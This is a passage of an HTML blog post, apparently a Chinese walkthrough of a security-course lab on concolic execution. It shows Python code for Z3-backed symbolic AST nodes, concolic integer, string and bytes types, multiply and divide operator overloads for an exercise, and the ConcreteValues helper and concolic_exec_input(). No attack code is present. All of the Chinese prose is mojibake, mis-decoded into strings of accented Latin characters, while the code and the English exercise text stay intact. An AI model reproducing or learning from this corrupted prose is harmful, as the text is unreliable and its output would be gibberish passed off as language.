èŠ‚ç‚¹ç±»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Arithmetic</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Int(self.<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment">###...</span><br><br><span class="hljs-comment">## String operations</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Const(self.<span class="hljs-built_in">id</span>, z3.StringSort())<br></code></pre></td></tr></table></figure><h4 id="V-æ··åˆå˜é‡"><a href="#V-æ··åˆå˜é‡" class="headerlink" title="V. æ··åˆå˜é‡"></a>V. æ··åˆå˜é‡</h4><p>æ­£å¦‚å‰æ–‡æ‰€è¨€ï¼Œæˆ‘ä»¬å®é™…ä¸Šåœ¨æ··åˆæ‰§è¡Œå¼•æ“å½“ä¸­ä½¿ç”¨çš„ä¸ºæ··åˆå‹ï¼ˆconcolicï¼‰çš„å˜é‡æ¥å‚¨å­˜çº¦æŸå€¼ï¼Œæ¡†æ¶ä¸­æä¾›äº†ä¸‰ç§ç±»å‹çš„æ··åˆå˜é‡â€”â€”<code>concolic_int</code> ï¼ˆæ•´å‹ï¼‰ã€ <code>concolic_str</code>ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€<code>concolic_bytes</code>ï¼ˆå­—ç¬¦æ•°ç»„ï¼‰ï¼Œå…¶ä¸­å…·ä½“å€¼ï¼ˆconctre valueï¼‰å­˜æ”¾åœ¨ <code>__v</code> æˆå‘˜ä¸­ï¼Œç¬¦å·å€¼ï¼ˆsymbolic valueï¼‰å­˜æ”¾åœ¨ <code>__sym</code> ä¸­</p><p>ä¸»è¦æ˜¯<strong>å¤§é‡çš„è¿ç®—ç¬¦é‡è½½</strong>ï¼Œè¿™é‡Œå°±ä¸è´´å®Œæ•´ä»£ç äº†ï¼Œå¯ä»¥è‡ªå·±å»çœ‹ï¼ˆç¬‘ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_int</span>(<span class="hljs-title class_ inherited__">int</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    self = <span class="hljs-built_in">super</span>(concolic_int, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">## ...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_str</span>(<span class="hljs-title class_ inherited__">str</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">str</span><br>    self = <span class="hljs-built_in">super</span>(concolic_str, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_bytes</span>(<span class="hljs-title class_ inherited__">bytes</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">bytes</span><br>    self = <span class="hljs-built_in">super</span>(concolic_bytes, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><hr><p>æ¥ä¸‹æ¥æ˜¯ Exercise 2ï¼šé€šè¿‡å¢åŠ æ•´å‹ä¹˜æ³•ä¸é™¤æ³•æ”¯æŒæ¥å®Œæˆå¯¹ <code>symex/fuzzy.py</code> ä¸­ <code>concolic_int</code> çš„å®ç°ï¼Œæˆ‘ä»¬éœ€è¦é‡è½½é¢å¤–çš„æ–¹æ³•å¹¶ä¸ºä¹˜é™¤æ³•è¿ç®—æ·»åŠ  AST èŠ‚ç‚¹ï¼Œå¹¶ä¸ºè¿™äº› AST èŠ‚ç‚¹åº”ç”¨ <code>_z3expr</code></p><blockquote><p><strong>Exercise 2.</strong> Finish the implementation of <code>concolic_int</code> by adding support for integer multiply and divide operations. You will need to overload additional methods in the <code>concolic_int</code> class (see the documentation for <a href="https://docs.python.org/3/library/operator.html">operator functions in Python 3</a>), add AST nodes for multiply and divide operations, and implement <code>_z3expr</code> appropriately for those AST nodes.</p><p>Look for the comments <code>Exercise 2: your code here</code> in <code>symex/fuzzy.py</code> to find places where we think you might need to write code to solve this exercise.</p><p>Run <strong>.&#x2F;check-concolic-int.py</strong> or <strong>make check</strong> to check that your changes to <code>concolic_int</code> work correctly.</p></blockquote><p>æˆ‘ä»¬é¦–å…ˆå®ç°ç¬¦å·å˜é‡ä¹˜é™¤æ‰€éœ€çš„ <code>sym_binop</code> å­ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬å‚ç…§å‰é¢çš„åŠ å‡è¿ç®—ç›´æ¥è°ƒç”¨ <code>z3expr()</code> æ¥è¿”å› Z3 è¡¨è¾¾å¼å³å¯</p><p>éœ€è¦æ³¨æ„çš„æ˜¯è™½ç„¶ python çš„é™¤æ³•è¿ç®—æœ‰ <code>/</code> ä¸ <code>//</code>ä¸¤ç§ï¼Œä½†æ˜¯ Z3å¹¶ä¸æ”¯æŒ <code>ArithRef</code> ä¸ <code>int</code> ç›´æ¥è¿›è¡Œ <code>//</code> è¿ç®—ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªå®ç°ä¸€ä¸ªæ™®é€šçš„ä¹˜æ³•å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement AST nodes for division and multiplication.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_mul</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) * z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_div</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) / z3expr(self.b)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬é‡å†™ <code>concolic_int</code> çš„ä¹˜æ³•ä¸é™¤æ³•ï¼Œæˆ‘ä»¬å…ˆå‚è€ƒä¸€ä¸‹ <code>concolic_int </code>ä¸­çš„åŠ æ³•è¿ç®—æ–¹å¼ï¼šã€</p><ul><li>é¦–å…ˆåˆ¤æ–­è¿ç®—å¯¹è±¡æ˜¯å¦ä¸º <code>concolic_int</code> ï¼Œè‹¥æ˜¯åˆ™å°†è‡ªèº«å…·ä½“å€¼åŠ ä¸Šå¯¹è±¡å…·ä½“å€¼ï¼Œå¦åˆ™ç›´æ¥åŠ ä¸Šè¯¥å¯¹è±¡ï¼Œç»“æœå­˜æ”¾åˆ° <code>res</code></li><li>åˆ›å»ºä¸€ä¸ªæ–°çš„ <code>concolic_int</code> å®ä¾‹ä½œä¸ºè¿”å›å€¼ï¼Œ<code>res</code> ä½œä¸ºå…¶å…·ä½“å€¼éƒ¨åˆ†ï¼Œåˆ›å»ºä¸¤ä¸ª <code>ast</code> å®ä¾‹å¹¶åˆ©ç”¨ <code>sym_plus()</code> è®¡ç®—ç»“æœä½œä¸ºæ–° concolic_int çš„ç¬¦å·å€¼éƒ¨åˆ†</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v + o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v + o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_plus(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬çš„ä¹˜é™¤æ³•å…¶å®ä¾è‘«èŠ¦ç”»ç“¢å³å¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¦åŒæ—¶å®ç° <code>/</code> ä¸ <code>//</code> ä¸¤ç§é™¤æ³•è¿ç®—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 2: your code here.</span><br><span class="hljs-comment">## Implement symbolic division and multiplication.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v * o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v * o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_mul(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__truediv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v / o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v / o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__floordiv__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_int):<br>    res = self.__v // o.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = self.__v // o<br>  <span class="hljs-keyword">return</span> concolic_int(sym_div(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 2ï¼š</p><p><img src="https://s2.loli.net/2022/12/18/TBNqmRi5fVsFlCk.png" alt="image.png"></p><p>ç„¶åæ˜¯ Exercise 3ï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬ç†Ÿæ‚‰æ··åˆæ‰§è¡Œç³»ç»Ÿçš„ä½¿ç”¨æ–¹å¼ï¼Œè¿™é‡Œæä¾›çš„é€”å¾„æ˜¯ä¿®æ”¹ <code>symex_exercises.py</code> ä»¥ç»™äºˆæµ‹è¯•ç³»ç»Ÿæ­£ç¡®çš„è¾“å…¥ï¼š</p><blockquote><p><strong>Exercise 3.</strong> An important component of concolic execution is <code>concolic_exec_input()</code> in <code>symex/fuzzy.py</code>. We have given you the implementation. You will use it to build a complete concolic execution system. To understand how to use <code>concolic_exec_input()</code>, you should create an input such that you pass the first check in <code>symex/check-symex-int.py</code>. Donâ€™t modify <code>symex/check-symex-int.py</code> directly, but instead modify <code>symex_exercises.py</code>. Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p></blockquote><p>æ··åˆæ‰§è¡Œæ¡†æ¶çš„æ ¸å¿ƒç»„ä»¶ä¾¿æ˜¯ <code>symex/fuzzy.py</code>  ä¸­çš„  <code>concolic_exec_input()</code> ï¼Œé¢˜ç›®è¯´åç»­æˆ‘ä»¬å°†ç”¨å…¶å®ç°ä¸€ä¸ªå®Œæ•´çš„æ··åˆæ‰§è¡Œç³»ç»Ÿï¼Œé‚£æˆ‘ä»¬å…ˆæ¥çœ‹å…¶ç›¸å…³çš„å…·ä½“å®ç°</p><h3 id="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-2"><a href="#æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-2" class="headerlink" title="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 2"></a>æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 2</h3><h4 id="VI-å…·ä½“å€¼å­—å…¸-ConcreteValues"><a href="#VI-å…·ä½“å€¼å­—å…¸-ConcreteValues" class="headerlink" title="VI.å…·ä½“å€¼å­—å…¸ - ConcreteValues"></a>VI.å…·ä½“å€¼å­—å…¸ - ConcreteValues</h4><p>å¦‚å‰æ–‡æ‰€è¨€ï¼Œåœ¨æ··åˆæ‰§è¡Œä¸‹è¢«æµ‹è¯•çš„ç¨‹åºè¾“å…¥éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªå…¨å±€å­—å…¸ä¸­ï¼Œå®ä¸ºä¸€ä¸ª<code>ConctreteValues</code> ç±»å¯¹è±¡ï¼Œå®é™…ä¸Šå°±æ˜¯ python å­—å…¸çš„ä¸€ä¸ª wrapper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ConcreteValues maintains a dictionary of variables name to values.</span><br><span class="hljs-comment"># If a variable is created and it doesn&#x27;t exist, we use a default</span><br><span class="hljs-comment"># value for the variable (0 for int and &#x27;&#x27; for string).</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteValues</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>    self.concrete_values = &#123;&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>symex/fuzzy.py</code> ä¸­æœ‰ä¸€ä¸ªå…¨å±€å˜é‡ <code>current_concrete_values</code>ï¼Œå®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬å‰é¢æ‰€è¯´çš„å…¨å±€å…·ä½“å€¼å­—å…¸ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>ConctreteValues.mk_global()</code> ä½¿è¯¥å¯¹è±¡å˜ä¸ºå…¨å±€å¼•ç”¨ï¼Œå³æˆ‘ä»¬æ¯æ¬¡ä½¿ç”¨åªéœ€è¦åˆ›å»ºä¸€ä¸ª<code>ConctreteValues</code> å¯¹è±¡å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># During concolic execution, new variables will be added to</span><br><span class="hljs-comment"># current_concrete_values, which is an instance of ConcreteValues.</span><br><span class="hljs-comment"># This variable is global because application code, the concolic</span><br><span class="hljs-comment"># Execution engine, and test code, all create new variables.  We make</span><br><span class="hljs-comment"># it global so that we don&#x27;t have to modify application code.  At the</span><br><span class="hljs-comment"># start of a concolic execution we will set this variable to the</span><br><span class="hljs-comment"># concrete values to be used.</span><br><br>current_concrete_values=<span class="hljs-literal">None</span><br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_global</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">global</span> current_concrete_values<br>    current_concrete_values = self<br></code></pre></td></tr></table></figure><p>åœ¨è¯¥ç±»ä¸­æœ‰ä¸‰ä¸ªæŸ¥è¯¢å­—å…¸å†… id å¯¹åº”å…·ä½“å€¼å¹¶è¿”å›æ··åˆå€¼çš„å‡½æ•°ï¼Œè‹¥ id ä¸åœ¨å­—å…¸å†…åˆ™è¿›è¡Œæ·»åŠ ï¼ŒåŒæ—¶åœ¨ <code>symex/fuzzy.py</code> ä¸­å¸¦æœ‰ä¸‰ä¸ªå¯¹è¿™äº›å‡½æ•°çš„ wrapperï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_int(sym_int(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_str(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, initval</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = initval<br>    <span class="hljs-keyword">return</span> concolic_bytes(sym_str(<span class="hljs-built_in">id</span>), self.concrete_values[<span class="hljs-built_in">id</span>])<br><br><span class="hljs-comment">#...</span><br><br><span class="hljs-comment"># Wrapper functions to allow application code to create new</span><br><span class="hljs-comment"># variables. They will be added to the current global current</span><br><span class="hljs-comment"># concrete values.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_int</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_int(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_str</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_str(<span class="hljs-built_in">id</span>, initval)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_bytes</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, initval</span>):<br>  <span class="hljs-keyword">global</span> current_concrete_values<br>  <span class="hljs-keyword">return</span> current_concrete_values.mk_bytes(<span class="hljs-built_in">id</span>, initval)<br></code></pre></td></tr></table></figure><p>é™¤äº†ä¸Šé¢çš„å‡½æ•°ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>add()</code> æˆå‘˜å‡½æ•°æ¥å‘å­—å…¸å†…æ·»åŠ æ˜ å°„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span>, v</span>):<br>  self.concrete_values[<span class="hljs-built_in">id</span>] = v<br></code></pre></td></tr></table></figure><p>ä»¥åŠè¿˜æœ‰ä¸€ä¸ª <code>canonical_rep()</code> æˆå‘˜å‡½æ•°ç”¨ä»¥è¿”å›å­—å…¸ä¸­çš„é”®å€¼å¯¹å…ƒç»„æ’åºåˆ—è¡¨ï¼Œä»¥åŠ <code>var_names()</code> ç”¨ä»¥è¿”å› id åˆ—è¡¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">canonical_rep</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(self.concrete_values.items())<br><br><span class="hljs-comment">#...</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">var_names</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.concrete_values.keys()<br></code></pre></td></tr></table></figure><p>ä»¥åŠä¸€ä¸ª <code>inherit()</code> æˆå‘˜å‡½æ•°ç”¨ä»¥ä»å¦ä¸€ä¸ªå­—å…¸ä¸­æ‹·è´é”®å€¼å¯¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">inherit</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> o.concrete_values:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.concrete_values:<br>      self.concrete_values[<span class="hljs-built_in">id</span>] = o.concrete_values[<span class="hljs-built_in">id</span>]<br></code></pre></td></tr></table></figure><h4 id="VII-concolic-exec-input-è¾“å…¥æ‰§è¡Œ"><a href="#VII-concolic-exec-input-è¾“å…¥æ‰§è¡Œ" class="headerlink" title="VII. concolic_exec_input() - è¾“å…¥æ‰§è¡Œ"></a>VII. concolic_exec_input() - è¾“å…¥æ‰§è¡Œ</h4><p>è¯¥å‡½æ•°å†…å®¹ç”¨ä»¥æ ¹æ®ç»™äºˆçš„å­—å…¸å¯¹ä¼ å…¥çš„å‡½æ•°è¿›è¡Œæ‰§è¡Œï¼Œæ•´ä½“é€»è¾‘æ¯”è¾ƒç®€å•ï¼š</p><ul><li>åˆå§‹åŒ–ä¸¤ä¸ªå…¨å±€ç©ºåˆ—è¡¨ <code>cur_path_constr</code> ï¼ˆ<strong>å½“å‰è·¯å¾„çš„æ¡ä»¶çº¦æŸ</strong>ï¼‰ä¸ <code>cur_path_constr_callers</code>ï¼ˆå½“å‰è·¯å¾„çš„ä¿¡æ¯ï¼‰</li><li>è°ƒç”¨ <code>concrete_values.mk_global()</code> ä½¿å…¶æˆä¸ºä¸€ä¸ªå…¨å±€å­—å…¸</li><li>è°ƒç”¨ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆæ¥è·å¾—ä¸€ä¸ªå€¼ <code>v</code>ï¼Œè‹¥å‚æ•° <code>verbose &gt; 1</code> åˆ™æ‰“å°ä¸¤ä¸ªåˆ—è¡¨çš„å†…å®¹</li><li>æœ€åçš„è¿”å›å€¼ä¸º <code>(v, cur_path_constr, cur_path_constr_callers)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolically execute testfunc with the given concrete_values. It</span><br><span class="hljs-comment"># returns the value testfunc computes for the given concrete_values</span><br><span class="hljs-comment"># and the branches it encountered to compute that result.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_exec_input</span>(<span class="hljs-params">testfunc, concrete_values, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-keyword">global</span> cur_path_constr, cur_path_constr_callers<br>  cur_path_constr = []<br>  cur_path_constr_callers = []<br>    <br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying concrete value:&#x27;</span>, concrete_values)<br><br>  <span class="hljs-comment"># make the concrete_value global so that new variables created</span><br>  <span class="hljs-comment"># by testfunc(), directly or indirectly, will be added to</span><br>  <span class="hljs-comment"># 